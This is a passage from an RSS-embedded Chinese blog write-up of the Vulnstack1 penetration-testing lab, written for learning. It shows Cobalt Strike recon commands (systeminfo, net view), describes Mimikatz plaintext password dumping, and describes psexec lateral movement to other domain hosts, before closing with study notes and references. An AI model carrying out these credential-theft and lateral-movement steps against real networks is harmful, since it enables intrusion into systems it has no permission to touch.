&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sleep &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;# 将心跳修改为0，方便快速获取信息（真实情况下不建议使用），默认为60s交互一次&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;shell systeminfo &lt;span class=&#34;c1&#34;&gt;# 查看域信息，两张网卡的信息包括IP地址，&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;net view &lt;span class=&#34;c1&#34;&gt;# 扫描域中的其他计算机&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;我们尝试利用Mimikatz来获取当前主机上存储的密码： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-06-09_screenshot.png&#34;
         alt=&#34;Figure 16: Mimikatz获取明文密码&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 16: &lt;!-- raw HTML omitted --&gt;Mimikatz获取明文密码&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-06-51_screenshot.png&#34;
         alt=&#34;Figure 17: 明文密码&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 17: &lt;!-- raw HTML omitted --&gt;明文密码&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-07-57_screenshot.png&#34;
         alt=&#34;Figure 18: net view查看局域网中的其他计算机&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 18: &lt;!-- raw HTML omitted --&gt;net view查看局域网中的其他计算机&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-10-12_screenshot.png&#34;
         alt=&#34;Figure 19: 其他局域网的计算机&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 19: &lt;!-- raw HTML omitted --&gt;其他局域网的计算机&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;最后我们使用psexec打下其他两台主机： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-15-56_screenshot.png&#34;
         alt=&#34;Figure 20: 使用psexec横向穿越&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 20: &lt;!-- raw HTML omitted --&gt;使用psexec横向穿越&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_15-17-55_screenshot.png&#34; width=&#34;700px&#34;/&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;最终我们可以通过拓扑图看到整一个横向移动的过程，我们先从kali对Win7进行getshell，然后再利用CS来获取Win7中的账号密码，以及域信息，最终使用psexec来横向移动到了其他两台计算机上 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure&gt;&lt;img src=&#34;https://ginkgo.org.cn/ox-hugo/2022-10-19_16-15-48_screenshot.png&#34;
         alt=&#34;Figure 22: 最终拓扑&#34; width=&#34;700px&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;&lt;!-- raw HTML omitted --&gt;Figure 22: &lt;!-- raw HTML omitted --&gt;最终拓扑&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;
 &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;h3 id=&#34;总结&#34;&gt;总结&lt;/h3&gt;
&lt;p&gt;复现是复现完了，但是其中有很多的内容都需要再具体展开来学习和研究，不过通过整一个流程还是学到了很多的知识和内容，还有就是CS太强了： &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 深入学习Cobalt Strike，了解使用的各种工具的用途 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 深入了解域以及域控制器，可以自行搭建一个域环境进行学习管理 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;li&gt;&lt;input disabled=&#34;&#34; type=&#34;checkbox&#34;&gt; 本文有机会也需要继续改进，感觉还是有很多一笔带过甚至自己都不懂的地方 &lt;!-- raw HTML omitted --&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;reference&#34;&gt;Reference&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/4tq9U&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Windows中的工作组(Work Group)、域(Domain)、域控(DC)、活动目录(AD)介绍&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/5sCVU&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;PHPmyadmin Getshell&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/HQo14&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;AD域的详细介绍&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://www.bilibili.com/video/BV1wf4y1a7FF?vd_source=13198d68e199803d43258bc64add9d55&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;[网络安全/域渗透]内网安全入门靶场 vulnstack1攻略&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://soapffz.com/archives/558/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;ATT&amp;amp;CK实战-红日安全vulnstack(一)&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/IfIoK&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;内网渗透靶场 Vulnstack（一）&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/qMJbd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;红日靶场vulnstack1 内网渗透学习&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/RsVXW&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Cobalt Strike使用教程——基础篇&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://t.csdn.cn/6JTun&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Cobalt Strike使用教程一&lt;/a&gt; &lt;!-- raw HTML omitted --&gt;&lt;/p&gt;
&lt;/blockquote&gt;
</description>
        </item>
        
    </channel>
</rss>
